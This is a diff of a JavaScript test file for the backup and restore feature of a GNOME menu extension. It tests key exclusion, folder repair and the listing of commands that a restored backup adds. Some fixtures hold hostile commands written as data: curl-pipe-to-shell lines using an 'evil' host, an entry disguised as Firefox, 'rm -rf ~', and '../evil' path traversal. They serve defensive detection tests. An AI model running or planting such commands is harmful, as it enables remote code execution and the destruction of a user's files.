@@ -64,6 +64,14 @@ test('createBackup: a key set to its default value is left out; a fresh install 
     assertEquals(JSON.parse(B.createBackup(s, '1')).settings, {});
 });
 
+test('every key the schema marks "(internal)" is excluded from backups by name', () => {
+    const schema = source.lookup(SCHEMA_ID, true);
+    const internal = schema.list_keys().filter(k => schema.get_key(k).get_summary()?.includes('(internal)'));
+    assert(internal.length >= 3, 'the schema has internal keys');
+    for (const key of internal)
+        assert(B.BACKUP_EXCLUDED_KEYS.includes(key), `${key} is internal but not in BACKUP_EXCLUDED_KEYS`);
+});
+
 test('round trip: restoring into a fresh instance reproduces every backed-up value and folder', () => {
     const src = configured();
     const r = parsed(B.createBackup(src, '1.3.0'));
@@ -84,7 +92,94 @@ test('unknown and excluded keys are ignored and reported, known ones still apply
     const r = parsed(doc({'menu-height': '700', 'no-such-key': '1', 'dev-mode': 'true', 'known-apps': "['x']"}));
     assert(r.ok);
     assertEquals([...r.plan.values.keys()], ['menu-height']);
-    assertEquals(r.plan.ignored.sort(), ['dev-mode', 'known-apps', 'no-such-key']);
+    assertEquals(r.plan.ignored, ['no-such-key']);
+    assertEquals(r.plan.skipped.sort(), ['dev-mode', 'known-apps']);
+});
+
+test('a folder the pinned list points at but the file does not hold is left out of the plan, and reported', () => {
+    const r = parsed(doc({'pinned-apps': "[{'id': 'a.desktop'}, {'id': 'f1', 'name': 'Games', 'isFolder': 'true'}, {'id': 'b.desktop'}]"}));
+    assert(r.ok, r.error);
+    assertEquals(r.plan.missingFolders, ['f1']);
+    assertEquals(r.plan.missingFolderNames, ['"Games"']);
+    assertEquals(r.plan.values.get('pinned-apps').recursiveUnpack(), [{id: 'a.desktop'}, {id: 'b.desktop'}]);
+    assertEquals(r.plan.ignored, []);
+    // a local folder of that name is replaced with everything else, never left behind empty and nameless
+    const dst = fresh();
+    dst.set('pinned-apps', [{id: 'f1', name: 'Mine', isFolder: 'true'}]);
+    dst.folder('f1').name = 'Mine';
+    dst.folder('f1').pinnedApps = [{id: 'x.desktop'}];
+    B.applyBackup(dst, r.plan);
+    assertEquals(dst.get('pinned-apps'), [{id: 'a.desktop'}, {id: 'b.desktop'}]);
+});
+
+test('restore repairs a damaged pinned structure (duplicates, nested folders) like the ArcMenu import', () => {
+    const e = id => `{'id': '${id}'}`;
+    const f = (id, name) => `{'id': '${id}', 'name': '${name}', 'isFolder': 'true'}`;
+    const r = parsed(doc(
+        {'pinned-apps': `[${e('a.desktop')}, ${f('games', 'Games')}, ${e('c.desktop')}, ${f('games', 'Games')}, ${f('tools', 'Tools')}]`},
+        {
+            games: {name: 'Games', 'pinned-apps': `[${e('a.desktop')}, ${e('b.desktop')}, ${e('b.desktop')}, ${f('tools', 'Tools')}]`},
+            tools: {name: 'Tools', 'pinned-apps': `[${e('t.desktop')}]`},
+        },
+    ));
+    assert(r.ok, r.error);
+    assertEquals(r.plan.ignored, []);
+    const dst = fresh();
+    B.applyBackup(dst, r.plan);
+    assertEquals(dst.get('pinned-apps'), [{id: 'a.desktop'}, {id: 'games', name: 'Games', isFolder: 'true'}, {id: 'c.desktop'}, {id: 'tools', name: 'Tools', isFolder: 'true'}]);
+    assertEquals(dst.folder('games').pinnedApps, [{id: 'b.desktop'}]);
+    assertEquals(dst.folder('tools').pinnedApps, [{id: 't.desktop'}]);
+});
+
+test('isCommandEntry classifies like the launch code', async () => {
+    const {isCommandEntry} = await import('../build/core/entries.js');
+    for (const [e, inPinned] of [[{id: 'firefox.desktop'}, true], [{id: 'org.gnome.Nautilus.desktop', name: 'Files'}, true], [{id: 'Spawn_Home'}, false],
+        [{id: 'ArcMenu_Home'}, false], [{id: '/home/u'}, false], [{id: 'file:///x'}, false], [{id: 'f1', isFolder: 'true'}, true], [{id: ' '}, false],
+        [{id: "sh -c 'x' a.desktop"}, false]])
+        assertEquals(isCommandEntry(e, inPinned), false, JSON.stringify(e));
+    for (const [e, inPinned] of [[{id: 'gnome-calculator'}, true], [{id: 'sh -c "curl evil|sh"', name: 'Home'}, false],
+        [{id: "sh -c 'curl http://e/x|sh' #.desktop", name: 'Firefox', icon: 'firefox'}, true],
+        [{id: "/bin/sh -c 'x' #.desktop", name: 'Firefox'}, true], [{id: 'xterm', isFolder: 'true'}, false]])
+        assertEquals(isCommandEntry(e, inPinned), true, JSON.stringify(e));
+});
+
+test('restore plan lists the commands a backup adds', () => {
+    const r = parsed(doc({
+        'directory-shortcuts': "[{'id': 'sh -c \"curl evil|sh\"', 'name': 'Home', 'icon': 'user-home-symbolic'}, {'id': 'Spawn_Home'}]",
+        'pinned-apps': "[{'id': 'gnome-calculator', 'name': 'gnome-calculator'}, {'id': 'one.desktop'}]",
+    }));
+    assert(r.ok, r.error);
+    assertEquals(r.plan.commands, ['gnome-calculator', '"Home" runs sh -c "curl evil|sh"']);
+    assert(B.describeCommands(r.plan).startsWith('Commands it adds to the menu, run when clicked: gnome-calculator, "Home" runs'));
+});
+
+test('a command already in the current settings is not listed', () => {
+    const s = fresh();
+    s.set('application-shortcuts', [{id: 'gnome-calculator'}]);
+    const r = parsed(doc({'pinned-apps': "[{'id': 'gnome-calculator', 'name': 'Calc'}]"}), s);
+    assert(r.ok, r.error);
+    assertEquals(r.plan.commands, []);
+    assertEquals(B.describeCommands(r.plan), '');
+});
+
+test('round trip of a configured() backup lists no commands', () => {
+    const r = parsed(B.createBackup(configured(), '1.3.0'));
+    assertEquals(r.plan.commands, []);
+});
+
+test('more than 8 commands are summarised', () => {
+    const list = Array.from({length: 10}, (_, i) => `{'id': 'c${i}'}`).join(', ');
+    const r = parsed(doc({'application-shortcuts': `[${list}]`}));
+    assert(r.ok, r.error);
+    assertEquals(r.plan.commands.length, 10);
+    assert(B.describeCommands(r.plan).endsWith(', and 2 more.'), B.describeCommands(r.plan));
+});
+
+test('commands inside a folder are not listed', () => {
+    const r = parsed(doc({'pinned-apps': "[{'id': 'f1', 'name':'Games','isFolder':'true'}]"},
+        {f1: {name: 'Games', 'pinned-apps': "[{'id':'rm -rf ~','name':'Firefox','icon':'firefox'}]"}}));
+    assert(r.ok, r.error);
+    assertEquals(r.plan.commands, []);
 });
 
 test('rejected: not JSON, wrong format, missing / newer version, damaged structure', () => {
@@ -116,7 +211,8 @@ test('folders: only those the restored pinned list points at; bad ids and bodies
     const r = parsed(doc({'pinned-apps': pinned}, {f1: good, stray: good}));
     assert(r.ok);
     assertEquals([...r.plan.folders.keys()], ['f1']);
-    assert(r.plan.ignored.includes('folder stray'));
+    assert(r.plan.skipped.includes('folder stray'));
+    assertEquals(r.plan.ignored, []);
     assertEquals(parsed(doc({'pinned-apps': pinned}, {'../evil': good})).ok, false);
     assertEquals(parsed(doc({'pinned-apps': pinned}, {'a/b': good})).ok, false);
     assertEquals(parsed(doc({'pinned-apps': pinned}, {f1: {name: 5, 'pinned-apps': '[]'}})).ok, false);
